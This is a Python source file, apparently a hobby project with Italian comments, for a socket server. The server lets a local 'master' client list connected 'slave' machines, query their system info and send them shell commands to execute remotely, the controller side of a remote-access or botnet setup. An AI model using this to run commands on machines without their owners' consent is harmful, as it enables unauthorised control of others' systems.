import textwrap
from typing import List
from audioop import add
import socket
import threading
from tkinter.messagebox import NO


from command_executioner import CommandExecutioner
from myparser import Parser



master_client = None 
list_of_clients : socket.socket= []
client_index = 0
parser_cmd = Parser()

server_port = 12000
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# '' means bind to all available interfaces
# server_port is the port number to listen on
# non appena il sistema operativo riceve un pacchetto 
# destinato a quella porta dallo al processo python
server_socket.bind(('', server_port))
server_socket.listen(1)



#Elenco di comandi di esempio
def get_name_of_selected_client(args:dict ={}) -> str:
    return str(list_of_clients[client_index].getpeername())

def flush_buffer(args:dict ={}):
    return [0, "flushing the buffer"]

def comando_esempio(args:dict ={}):
    # azioni del comando ...
    return [0, "Testing"] # exit_status, messaggio da inviare al client

def clients_connected(args:dict ={}):
    return [0, "Clients: "+str(len(list_of_clients))]

def select_next_client(args:dict ={}):
    # azioni del comando ...
    if len(list_of_clients)==0:
        return [0, "No clients connected"]
    global client_index
    client_index += 1
    if client_index >= len(list_of_clients):
        client_index=0
    
    return [0, "Selezionato client "+get_name_of_selected_client()] # exit_status, messaggio da inviare al client

def say_hello_to_client(args:dict ={}):
    if len(list_of_clients)==0:
        return [0, "No clients connected"]

    list_of_clients[client_index].send("hello from master".encode())
    info = list_of_clients[client_index].recv(1024).decode()

    return [0,"Sent hello to "+get_name_of_selected_client()+ ", got response: "+str(info)]

def client_sysinfo(args:dict = {}):
    if len(list_of_clients)==0:
        return [0, "No clients connected"]

    list_of_clients[client_index].send("sysinfo".encode())
    info = list_of_clients[client_index].recv(1024).decode()

    return [0,"Sent sysinfo to "+get_name_of_selected_client()+ ", got response: "+str(info)]

def shell_command(args:dict ={}):
    if len(list_of_clients)==0:
        return [0, "No clients connected"]
    msg_to_cli = "shellexec "
    for k in args.keys():
        msg_to_cli+= str(k)+" '"+str(args[k])+"' "
    #print("msgtocli = "+msg_to_cli)
    list_of_clients[client_index].send(msg_to_cli.encode())
    info = list_of_clients[client_index].recv(1024).decode()

    return [0,"Sent shellexec to "+get_name_of_selected_client()+ ", got response: "+str(info)]

def close_slave_conn(args:dict ={}):
    if len(list_of_clients)==0:
        return [0, "No clients connected"]

    list_of_clients[client_index].send("closecli".encode())
    info = list_of_clients[client_index].recv(1024).decode()

    name = get_name_of_selected_client()

    list_of_clients[client_index].close()
    del list_of_clients[client_index]

    print("Finished serving SLAVE client "+name)
    return [0,"Sent closecli to "+name+ ", got response: "+str(info)]

def help(args:dict ={}):
    return [0, "Commands availables: "+str(cmd_to_function.keys())[9:]]

def ping(args:dict ={}):
    return [0, "Pong"]

def chiudi_conn(args:dict ={}):
    return [-1 , "Closing connection"]

cmd_to_function = {
    "ping": ping,
    "exit": chiudi_conn,
    "help": help,
    "test":comando_esempio,
    "hello": say_hello_to_client,
    "clients": clients_connected,
    "selnext": select_next_client,
    "sysinfo": client_sysinfo,
    "closeslave": close_slave_conn,
    "shellexec":shell_command,
    "flush":flush_buffer
}

cmd_executioner = CommandExecutioner(cmd_to_function)


def handle_master_client(conn: socket.socket, addr):
    identification_message = "You are identified as MASTER client "+str(addr)
    conn.send(identification_message.encode())
    print("Started serving MASTER client", addr)
    while True:
        data = conn.recv(1024)
        if data:
            full_command = data.decode()
            try:
                parsed_cmd = parser_cmd.parse(full_command)
                cmd_name = parsed_cmd.pop(0)
                param_dict = parsed_cmd.pop(0)
                #print(str(cmd_name) + " , "+str(param_dict))
                exit_status, message = cmd_executioner.execute(cmd_name,param_dict)
                encoded_message = message.encode()
                
                conn.send(encoded_message)
                if  exit_status != 0:
                        break
            except Exception as e:
                conn.send("Syntax error, retry.".encode())
                print("ex: "+str(e))
    conn.close()
    global master_client
    master_client = None
    print("Finished serving MASTER client", addr)

print("Listening for clients on port",server_port,"...")
while True:
    try:
        connection_socket , addr = server_socket.accept()
        if '127.0.0.1' in addr and master_client is None:
            master_client = connection_socket
            threading.Thread(target=handle_master_client,args=(connection_socket,addr)).start()
        else:
            print("Adding "+str(connection_socket.getpeername())+" to list")

            identification_message = "You are identified as SLAVE client "+str(addr)
            connection_socket.send(identification_message.encode())

            list_of_clients.append(connection_socket)
            
    except Exception as e:
        print("Closing server: "+str(e))
        server_socket.close()
        break

